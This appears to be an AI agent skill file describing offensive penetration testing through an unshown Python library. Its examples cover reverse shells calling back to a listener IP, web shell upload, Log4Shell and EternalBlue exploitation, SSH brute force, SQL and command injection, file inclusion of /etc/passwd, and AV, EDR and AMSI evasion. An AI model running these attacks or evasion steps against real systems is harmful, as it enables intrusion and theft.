---
name: exploitation
description: |
  Exploitation techniques and payload development for authorized penetration testing.
  Generate exploits, manage payloads, and execute attacks against identified vulnerabilities.
  Use for exploitation phase of authorized security assessments.
license: Apache-2.0
compatibility: |
  - Python 3.9+
  - Optional: pwntools, impacket
metadata:
  author: SherifEldeeb
  version: "1.0.0"
  category: pentesting
---

# Exploitation Skill

Exploitation capabilities for authorized penetration testing engagements.

## Capabilities

- **Payload Generation**: Create custom payloads and shellcode
- **Exploit Development**: Develop and customize exploits
- **Framework Integration**: Work with Metasploit, Cobalt Strike
- **Buffer Overflow**: Stack and heap exploitation techniques
- **Web Exploitation**: SQL injection, command injection exploitation
- **Service Exploitation**: Exploit vulnerable services
- **Evasion Techniques**: AV/EDR evasion methods
- **Proof of Concept**: Generate PoC code for vulnerabilities

## Quick Start

```python
from exploit_utils import PayloadGenerator, ExploitBuilder, ServiceExploiter

# Generate payload
payload = PayloadGenerator()
shell = payload.generate_reverse_shell('10.0.0.1', 4444, 'python')
print(shell)

# Build exploit
exploit = ExploitBuilder('CVE-2021-44228')
exploit.set_target('192.168.1.100')
exploit.configure()
print(exploit.generate())

# Exploit service
service = ServiceExploiter('192.168.1.100', 445)
service.check_vulnerability('ms17-010')
```

## Usage

### Payload Generation

Generate various payloads for exploitation.

**Example**:
```python
from exploit_utils import PayloadGenerator

payload = PayloadGenerator()

# Reverse shell payloads
python_shell = payload.generate_reverse_shell('10.0.0.1', 4444, 'python')
bash_shell = payload.generate_reverse_shell('10.0.0.1', 4444, 'bash')
powershell_shell = payload.generate_reverse_shell('10.0.0.1', 4444, 'powershell')
php_shell = payload.generate_reverse_shell('10.0.0.1', 4444, 'php')

# Bind shell payloads
bind_shell = payload.generate_bind_shell(4444, 'python')

# Web shells
webshell = payload.generate_webshell('php')

# Command execution payloads
cmd_payload = payload.generate_command_exec('whoami', 'bash')

# Encoded payloads
encoded = payload.encode_payload(python_shell, 'base64')
obfuscated = payload.obfuscate_payload(powershell_shell, 'powershell')

# List available payload types
print(payload.list_payload_types())
```

### Exploit Development

Build and customize exploits.

**Example**:
```python
from exploit_utils import ExploitBuilder

# Create exploit for known CVE
exploit = ExploitBuilder('CVE-2021-44228')  # Log4Shell

# Configure target
exploit.set_target('192.168.1.100', port=8080)
exploit.set_callback('10.0.0.1', 1389)

# Set options
exploit.set_option('payload', 'java/shell_reverse_tcp')
exploit.set_option('lhost', '10.0.0.1')
exploit.set_option('lport', 4444)

# Check if target is vulnerable
if exploit.check():
    print("Target is vulnerable")

# Generate exploit code
code = exploit.generate()
print(code)

# Execute (with authorization)
result = exploit.execute()
print(f"Success: {result['success']}")
print(f"Session: {result['session']}")

# Get PoC code
poc = exploit.get_poc()
print(poc)
```

### Service Exploitation

Exploit vulnerable network services.

**Example**:
```python
from exploit_utils import ServiceExploiter

# Target SMB service
smb = ServiceExploiter('192.168.1.100', 445)

# Check for vulnerabilities
vulns = smb.check_vulnerabilities([
    'ms17-010',  # EternalBlue
    'ms08-067',  # Conficker
    'cve-2020-0796'  # SMBGhost
])

for vuln in vulns:
    print(f"{vuln['cve']}: {vuln['vulnerable']}")

# Exploit specific vulnerability
if smb.check_vulnerability('ms17-010'):
    result = smb.exploit_ms17_010(
        callback_ip='10.0.0.1',
        callback_port=4444
    )
    print(f"Exploitation result: {result}")

# SSH exploitation
ssh = ServiceExploiter('192.168.1.100', 22)
ssh.brute_force(userlist=['root', 'admin'], passlist=['password', '123456'])

# FTP exploitation
ftp = ServiceExploiter('192.168.1.100', 21)
ftp.check_anonymous_login()
```

### Web Exploitation

Exploit web application vulnerabilities.

**Example**:
```python
from exploit_utils import WebExploiter

web = WebExploiter('https://target.com')

# SQL injection exploitation
sqli = web.exploit_sqli(
    url='/search?q=',
    technique='union',
    dbms='mysql'
)
print(f"Database: {sqli['database']}")
print(f"Tables: {sqli['tables']}")

# Command injection
cmd = web.exploit_command_injection(
    url='/ping',
    param='host',
    command='id'
)
print(f"Output: {cmd['output']}")

# File inclusion
lfi = web.exploit_lfi(
    url='/page?file=',
    target_file='/etc/passwd'
)
print(f"Contents: {lfi['contents']}")

# Deserialization
deser = web.exploit_deserialization(
    url='/api/deserialize',
    payload_type='java',
    command='whoami'
)

# Upload shell
shell = web.upload_shell(
    url='/upload',
    shell_type='php'
)
print(f"Shell URL: {shell['url']}")
```

### Buffer Overflow Exploitation

Develop buffer overflow exploits.

**Example**:
```python
from exploit_utils import BufferOverflowExploit

# Create BOF exploit
bof = BufferOverflowExploit()

# Find offset
offset = bof.find_offset(
    target='192.168.1.100',
    port=9999,
    pattern_length=2000
)
print(f"Offset: {offset}")

# Find bad characters
bad_chars = bof.find_bad_chars(
    target='192.168.1.100',
    port=9999,
    offset=offset
)
print(f"Bad chars: {bad_chars}")

# Find JMP ESP
jmp_esp = bof.find_jmp_esp(module='essfunc.dll')
print(f"JMP ESP: {hex(jmp_esp)}")

# Generate shellcode
shellcode = bof.generate_shellcode(
    payload='windows/shell_reverse_tcp',
    lhost='10.0.0.1',
    lport=4444,
    bad_chars=bad_chars
)

# Build exploit
exploit = bof.build_exploit(
    offset=offset,
    eip=jmp_esp,
    nop_sled=16,
    shellcode=shellcode
)

# Execute
bof.execute(target='192.168.1.100', port=9999, payload=exploit)
```

### Evasion Techniques

Evade security controls.

**Example**:
```python
from exploit_utils import EvasionTechniques

evasion = EvasionTechniques()

# Payload encoding
encoded = evasion.encode_payload(
    payload=shellcode,
    encoder='shikata_ga_nai',
    iterations=5
)

# PowerShell obfuscation
obfuscated = evasion.obfuscate_powershell(ps_script)

# AMSI bypass
amsi_bypass = evasion.generate_amsi_bypass()

# AV evasion
av_evaded = evasion.evade_av(
    payload=shellcode,
    technique='process_hollowing'
)

# Traffic encryption
encrypted_payload = evasion.encrypt_traffic(payload, key='secret')

# List evasion techniques
print(evasion.list_techniques())
```

## Configuration

### Environment Variables

| Variable | Description | Required | Default |
|----------|-------------|----------|---------|
| `EXPLOIT_CALLBACK_IP` | Default callback IP | No | Auto-detect |
| `EXPLOIT_CALLBACK_PORT` | Default callback port | No | `4444` |
| `MSF_RPC_HOST` | Metasploit RPC host | No | `127.0.0.1` |

### Options

| Option | Type | Description |
|--------|------|-------------|
| `verify_target` | bool | Verify target before exploitation |
| `auto_migrate` | bool | Auto-migrate on successful exploit |
| `cleanup` | bool | Clean up after exploitation |

## Examples

### Example 1: Full Exploitation Chain

**Scenario**: Exploit vulnerable web application

**Process**:
```python
# 1. Generate payload
payload = PayloadGenerator()
shell = payload.generate_reverse_shell('10.0.0.1', 4444, 'php')

# 2. Upload via vulnerable endpoint
web = WebExploiter('https://target.com')
uploaded = web.upload_shell('/upload', shell)

# 3. Trigger execution
web.trigger_shell(uploaded['url'])

# 4. Receive connection
# nc -lvnp 4444
```

## Limitations

- **Authorization Required**: Only for authorized testing
- **Detection Risk**: Exploitation may trigger alerts
- **Environment Specific**: Some exploits require specific conditions

## Troubleshooting

### Payload Blocked

**Problem**: Payload detected by AV

**Solution**: Use evasion techniques:
```python
payload = evasion.encode_payload(shellcode, 'shikata_ga_nai', 3)
```

### Connection Refused

**Problem**: Reverse shell not connecting

**Solution**: Check firewall rules and try different ports

## Related Skills

- [post-exploitation](../post-exploitation/): Post-exploitation activities
- [network-scanning](../network-scanning/): Service enumeration
- [web-app-testing](../web-app-testing/): Vulnerability identification
- [pentest-reporting](../pentest-reporting/): Document exploits

## References

- [MITRE ATT&CK](https://attack.mitre.org/)
- [ExploitDB](https://www.exploit-db.com/)
- [GTFOBins](https://gtfobins.github.io/)
